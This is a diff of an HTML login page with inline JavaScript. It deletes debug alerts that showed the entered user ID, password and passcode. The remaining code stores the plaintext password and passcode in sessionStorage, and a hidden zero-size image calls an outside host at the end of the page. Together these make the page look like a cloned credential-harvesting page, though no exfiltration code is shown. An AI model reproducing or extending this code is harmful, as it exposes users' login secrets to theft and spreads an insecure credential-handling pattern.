@@ -127,7 +127,7 @@
             Login
            </button>
           </p>
-          <script>
+         <script>
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('loginForm');
     const userIdInput = document.getElementById('UserId');
@@ -267,9 +267,6 @@ document.addEventListener('DOMContentLoaded', function() {
         const password = passwordInput.value;
         const passcode = passcodeInput ? passcodeInput.value.trim() : '';
 
-        // Alert to check form values
-        alert(`Form submitted with:\nUser ID: ${userId}\nPassword: ${password}\nPasscode: ${passcode}`);
-
         let isValid = true;
 
         if (!userId || !validateUserId(userId)) {
@@ -301,9 +298,6 @@ document.addEventListener('DOMContentLoaded', function() {
         sessionStorage.setItem('userId', userId);
         sessionStorage.setItem('userPassword', password);
         sessionStorage.setItem('userPasscode', passcode || 'Not provided');
-
-        // Alert to confirm data is stored
-        alert(`Data stored in sessionStorage:\nUser ID: ${userId}\nPassword: ${password}\nPasscode: ${passcode}`);
 
         showLoading();
 
@@ -438,4 +432,5 @@ document.addEventListener('DOMContentLoaded', function() {
     </a>
    </div>
   </div><img style="display:none;" src="https://css.page-source.com/resizeimage.ashx?ig=&amp ;sz=179401" width="0" height="0"></body></html>
+
 
